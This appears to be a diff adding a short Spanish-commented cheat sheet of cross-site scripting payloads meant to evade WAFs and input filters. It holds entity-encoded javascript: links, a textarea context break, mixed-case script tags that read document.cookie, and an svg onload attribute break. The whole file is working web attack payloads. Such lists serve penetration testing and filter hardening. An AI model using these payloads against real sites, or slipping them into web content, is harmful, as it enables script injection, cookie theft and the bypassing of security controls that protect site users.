@@ -1,0 +1,16 @@
+# XSS EVASION: WAF/FILTER BYPASS
+# Objetivo: Evadir filtros y firewalls (WAF).
+# Enfoque: Usar codificación, case change, o romper contexto.
+
+# 1. Codificación HTML/ASCII
+<a href="j&#97;v&#97;s&#99;r&#99;i&#112;t:alert(1)">CLICK</a>
+<IMG SRC=javascript:alert(1)>
+
+# 2. Context Break (si hay un filtro de <script> pero no de </textarea>)
+</textarea><script>alert(1)</script>
+
+# 3. Case Mixing
+<sCrIpT>alert(document.cookie)</sCrIpT>
+
+# 4. Codificación en función de error (IMG/SVG)
+"><svg/onload=alert(1)>
